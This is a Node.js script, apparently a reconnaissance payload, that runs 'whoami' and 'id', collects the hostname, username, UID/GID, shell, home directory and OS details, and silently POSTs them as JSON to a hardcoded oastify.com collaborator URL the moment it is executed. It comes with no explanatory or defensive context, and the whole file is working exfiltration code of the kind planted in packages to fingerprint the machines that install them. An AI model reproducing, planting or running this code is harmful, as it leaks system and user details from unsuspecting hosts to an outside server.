const { exec } = require('child_process');
const os = require('os');
const https = require('https');
const http = require('http');

// ===== CONFIGURATION =====
const SERVER_URL = 'https://1y02u0zpqrv2qh7uwba29l8zxq3hr7fw.oastify.com/testbydetox'; // Change this to your server URL
// =========================

// Function to execute shell commands
function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
        return;
      }
      resolve(stdout.trim());
    });
  });
}

// Get system information
async function getSystemInfo() {
  try {
    const systemData = {
      timestamp: new Date().toISOString(),
      whoami: '',
      id: '',
      pwd: '',
      hostname: os.hostname(),
      platform: os.platform(),
      architecture: os.arch(),
      homeDirectory: os.homedir(),
      userInfo: {
        username: os.userInfo().username,
        uid: os.userInfo().uid,
        gid: os.userInfo().gid,
        shell: os.userInfo().shell
      },
      osInfo: {
        type: os.type(),
        release: os.release(),
        totalMemory: os.totalmem(),
        freeMemory: os.freemem(),
        cpus: os.cpus().length
      }
    };

    // whoami - Get current username
    systemData.whoami = await executeCommand('whoami');

    // id - Get user ID and group information (Unix/Linux/Mac)
    if (process.platform !== 'win32') {
      systemData.id = await executeCommand('id');
    } else {
      systemData.id = 'Not available on Windows';
    }

    // pwd - Get current working directory
    systemData.pwd = process.cwd();

    return systemData;

  } catch (error) {
    console.error('Error getting system information:', error.message);
    throw error;
  }
}

// Send data to server
function sendToServer(data, url) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const protocol = urlObj.protocol === 'https:' ? https : http;
    
    const payload = JSON.stringify(data);
    
    const options = {
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
      path: urlObj.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const req = protocol.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve({ statusCode: res.statusCode, body: responseData });
        } else {
          reject(new Error(`Server returned ${res.statusCode}: ${responseData}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(error);
    });

    req.write(payload);
    req.end();
  });
}

// Main execution
async function main() {
  try {
    const systemInfo = await getSystemInfo();
    await sendToServer(systemInfo, SERVER_URL);
  } catch (error) {
    process.exit(1);
  }
}

// Run the script
main();
